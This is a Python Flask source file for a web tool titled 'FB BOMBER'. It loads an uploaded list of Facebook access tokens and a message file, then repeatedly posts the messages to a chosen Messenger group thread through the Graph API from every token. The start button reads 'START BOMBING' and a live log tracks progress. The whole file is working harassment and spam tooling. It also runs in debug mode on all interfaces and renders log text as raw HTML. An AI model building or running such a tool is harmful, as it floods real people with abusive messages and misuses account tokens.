from flask import Flask, request, render_template_string, jsonify
import requests
from threading import Thread, Event
import time
import secrets

app = Flask(__name__)
app.debug = True

# GLOBAL
headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j)',
    'Accept': 'application/json',
    'referer': 'https://www.facebook.com'
}

# TASK & LOGS
tasks = {}
logs = []
MAX_LOGS = 500

def add_log(task_id, msg, log_type="info"):
    log_entry = {
        "task_id": task_id,
        "msg": msg,
        "type": log_type,
        "time": time.strftime("%H:%M:%S")
    }
    logs.append(log_entry)
    if len(logs) > MAX_LOGS:
        logs.pop(0)

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = tasks[task_id]['stop_event']
    add_log(task_id, f"Bombing started on t_{thread_id}", "info")
    
    for access_token in access_tokens:
        if stop_event.is_set():
            break
        for message1 in messages:
            if stop_event.is_set():
                break
            message = f"{mn} {message1}"
            api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
            parameters = {
                'access_token': access_token,
                'message': message
            }
            try:
                r = requests.post(api_url, data=parameters, headers=headers, timeout=15)
                if r.status_code == 200:
                    result = r.json()
                    msg_id = result.get('id', 'sent')
                    add_log(task_id, f"SENT: {message}", "success")
                else:
                    err = r.json().get("error", {})
                    err_msg = err.get("message", "Unknown error")
                    err_code = err.get("code", "N/A")
                    add_log(task_id, f"FAILED [{err_code}]: {err_msg}", "error")
            except Exception as e:
                add_log(task_id, f"EXCEPTION: {str(e)}", "error")
            time.sleep(time_interval)
    
    add_log(task_id, "Bombing finished.", "info")

@app.route('/', methods=['GET', 'POST'])
def home():
    global tasks
    message = ""

    if request.method == 'POST':
        action = request.form.get('action')

        if action == 'start':
            token_file = request.files['tokenFile']
            access_tokens = [l.strip() for l in token_file.read().decode().splitlines() if l.strip()]

            thread_id = request.form.get('threadId').strip()
            if not thread_id.startswith('t_'):
                thread_id = 't_' + thread_id  # AUTO ADD t_

            mn = request.form.get('kidx')
            time_interval = int(request.form.get('time'))

            txt_file = request.files['txtFile']
            messages = [l.strip() for l in txt_file.read().decode().splitlines() if l.strip()]

            if not access_tokens:
                message = "<p style='color:#f55;'>No valid tokens!</p>"
            elif not messages:
                message = "<p style='color:#f55;'>No messages!</p>"
            else:
                task_id = secrets.token_hex(4).upper()
                stop_event = Event()

                thread = Thread(
                    target=send_messages,
                    args=(access_tokens, thread_id, mn, time_interval, messages, task_id)
                )
                thread.daemon = True
                thread.start()

                tasks[task_id] = {
                    'thread': thread,
                    'stop_event': stop_event,
                    'info': {
                        'gc_id': thread_id,
                        'tokens': len(access_tokens),
                        'messages': len(messages),
                        'delay': time_interval,
                        'started': time.strftime("%H:%M:%S")
                    }
                }
                message = f"<p style='color:#0f0;'>STARTED! TASK ID: <b>{task_id}</b></p>"

        elif action == 'stop':
            task_id = request.form.get('task_id', '').strip().upper()
            if task_id in tasks:
                tasks[task_id]['stop_event'].set()
                del tasks[task_id]
                message = f"<p style='color:#f55;'>TASK {task_id} STOPPED!</p>"
            else:
                message = "<p style='color:#f55;'>Invalid Task ID!</p>"

        elif action == 'stop_all':
            for tid in list(tasks.keys()):
                tasks[tid]['stop_event'].set()
            tasks.clear()
            message = "<p style='color:#f55;'>ALL STOPPED!</p>"

        elif action == 'clear_logs':
            global logs
            logs = []
            message = "<p style='color:#0f0;'>Console cleared!</p>"

    return render_template_string(HOME_TEMPLATE, tasks=tasks, message=message)

@app.route('/logs')
def get_logs():
    return jsonify(logs)

HOME_TEMPLATE = '''
<!DOCTYPE html>
<html><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>FB BOMBER</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
<style>
  body{background:#000 url('https://i.imgur.com/92rqE1X.jpeg') center/cover;color:white;}
  .container{max-width:420px;margin:20px auto;padding:20px;border-radius:20px;background:rgba(0,0,0,0.7);box-shadow:0 0 30px #0f0;}
  .form-control{background:transparent;border:1px solid #0f0;color:white;border-radius:10px;}
  .console{background:#111;border:1px solid #0f0;padding:10px;height:300px;overflow-y:auto;border-radius:10px;font-family:monospace;font-size:13px;}
  .log-success{color:#0f0;}.log-error{color:#f55;}.log-info{color:#ff0;}
  .task-id{color:#0ff;font-weight:bold;}
  .clear-btn{background:#555;color:white;border:none;padding:5px 10px;border-radius:5px;}
</style>
</head><body>
<div class="container text-center">
<h1 style="text-shadow:0 0 20px #0f0;">FB BOMBER</h1>

<form method="post" enctype="multipart/form-data">
<input type="hidden" name="action" value="start">
<div class="mb-3"><label>TOKEN FILE</label><input type="file" class="form-control" name="tokenFile" required></div>
<div class="mb-3"><label>GC ID (auto adds t_)</label><input type="text" class="form-control" name="threadId" placeholder="2208341826321706" required></div>
<div class="mb-3"><label>HATHER NAME</label><input type="text" class="form-control" name="kidx" value="LEGEND" required></div>
<div class="mb-3"><label>DELAY (sec)</label><input type="number" class="form-control" name="time" value="5" required></div>
<div class="mb-3"><label>MESSAGE FILE</label><input type="file" class="form-control" name="txtFile" required></div>
<button type="submit" class="btn btn-success w-100">START BOMBING</button>
</form>

<form method="post" class="mt-3">
<input type="hidden" name="action" value="stop">
<div class="input-group">
<input type="text" class="form-control" name="task_id" placeholder="Task ID to STOP">
<button type="submit" class="btn btn-danger">STOP</button>
</div>
</form>

<div class="mt-3 d-flex justify-content-center gap-2">
<form method="post"><input type="hidden" name="action" value="stop_all"><button class="btn btn-danger btn-sm">STOP ALL</button></form>
<form method="post"><input type="hidden" name="action" value="clear_logs"><button class="clear-btn">CLEAR</button></form>
</div>

<div class="mt-3">{{ message|safe }}</div>

{% if tasks %}
<h5 style="color:#0f0;">ACTIVE ({{ tasks|length }})</h5>
{% for tid, d in tasks.items() %}
<div style="background:#111;border:1px solid #0f0;padding:10px;margin:8px 0;border-radius:8px;">
<p><span class="task-id">{{ tid }}</span> → {{ d.info.gc_id }}</p>
<p>Tokens: {{ d.info.tokens }} | Delay: {{ d.info.delay }}s</p>
</div>
{% endfor %}
{% endif %}

<h5 style="color:#0f0;">LIVE CONSOLE</h5>
<div id="console" class="console"></div>
</div>

<script>
function updateConsole() {
  fetch('/logs')
    .then(r => r.json())
    .then(data => {
      const c = document.getElementById('console');
      c.innerHTML = '';
      data.forEach(l => {
        const div = document.createElement('div');
        div.className = 'log-' + l.type;
        div.innerHTML = `<small>${l.time}</small> <b>[${l.task_id}]</b> ${l.msg}`;
        c.appendChild(div);
      });
      c.scrollTop = c.scrollHeight;
    })
    .catch(err => console.error('Log fetch error:', err));
}
setInterval(updateConsole, 1000);
updateConsole();
</script>
</body></html>
'''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
